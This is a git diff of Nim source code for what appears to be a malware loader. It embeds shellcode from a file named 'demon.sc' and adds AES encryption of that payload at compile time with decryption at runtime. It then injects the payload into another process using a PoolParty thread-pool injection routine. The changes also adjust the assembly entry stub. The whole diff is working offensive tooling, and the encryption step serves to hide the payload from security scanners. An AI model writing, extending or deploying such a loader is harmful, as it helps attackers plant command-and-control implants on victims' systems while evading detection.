@@ -1,15 +1,13 @@
 import winim/lean
 
-import utils/[stdio, stackstr]
+import utils/[encryption, decryption, stdio, stackstr]
 import utils/stdlib/[stringh]
 
 import nimpool/[nimpool, ioinject]
 import instance
 
-# Read in shellcode at compile time
-const 
-  buf   = staticRead("demon.sc").cstring
-  szBuf = 103935
+# Read in shellcode at compile time and encrypt it
+var (buf, key, iv) = static(encryptAes(slurp("demon.sc")))
 
 proc getProcessIdViaNtQueryFunc(szProcessName: pointer, pdwProcessId: var DWORD, phProcess: ptr HANDLE = cast[ptr HANDLE](0)): bool =
   var 
@@ -89,10 +87,22 @@ proc doPoolPartyVar1(pBuf: pointer, szBuf: int): bool =
 proc main() {.exportc: "Main".} =
   discard init(ninst)
 
-  let pBuf = buf
+  var 
+    pBuf = buf[0].addr
+    szBuf = buf.len
   PRINTA("[+] Payload at %p of size %i\n", pBuf, szBuf)
+  PRINTA("[+] Key at %p of size %i\n", key[0].addr, key.len)
+  PRINTA("[+] IV  at %p of size %i\n", iv[0].addr, iv.len)
 
-  var bResult = doPoolPartyVar1(pBuf, szBuf)
+  # Decrypt
+  var 
+    nBuf: PBYTE
+    sznBuf: int
+
+  if installAesDecryption(pBuf, szBuf, key[0].addr, iv[0].addr, nBuf.addr, sznBuf.addr):
+    PRINTA("[+] Successfully decrypted at %p of size %i\n", nBuf, sznBuf)
+
+  var bResult = doPoolPartyVar1(nBuf, sznBuf)
   
   PRINTA("[+] doPoolPartyVar1 returned: %i\n", cast[int](bResult))
 
@@ -102,10 +112,9 @@ proc main() {.exportc: "Main".} =
 {.passC:"-masm=intel".}
 proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
   asm """
-    and rsp, 0xfffffffffffffff0
-    sub rsp, 0x10
+    shr rsp, 4
+    shl rsp, 4
     call Main
-    add rsp, 0x10
     ret
   """
 
